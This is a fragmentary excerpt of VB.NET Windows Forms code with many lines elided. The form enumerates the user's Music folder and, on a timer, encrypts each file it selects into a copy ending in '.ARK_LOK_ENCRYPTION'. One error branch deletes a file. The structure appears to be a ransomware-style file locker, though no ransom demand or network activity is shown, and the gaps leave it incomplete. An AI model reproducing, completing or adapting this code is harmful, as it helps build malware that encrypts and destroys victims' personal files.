...
Public Class Form2
    ...
    Private TUNEZ As String = Environment.GetFolderPath(Environment.SpecialFolder.MyMusic)

    Private Sub Form2_Load(sender As Object, e As EventArgs) Handles MyBase.Load

        Try
            For Each fDir As String In My.Computer.FileSystem.GetDirectories(TUNEZ)
        ...
        Try
            ...
            For Each fDir As String In My.Computer.FileSystem.GetFiles(TUNEZ)
    ...
    Public Sub EncryptOrDecryptFile(ByVal strInputFile As String,
        ...
        Catch
            ...
            If Direction = CryptoAction.ActionDecrypt Then
                Dim fileDelete As New FileInfo(TUNEZ)
                fileDelete.Delete()
    ...
    Private Sub Timer1_Tick(sender As Object, e As EventArgs) Handles Timer1.Tick
        ...
        Else
            ...
            TUNEZ = CStr(ListBox8.SelectedItem)
            Try
                Dim bytIV As Byte()
                ...
                EncryptOrDecryptFile(TUNEZ, TUNEZ + ".ARK_LOK_ENCRYPTION",
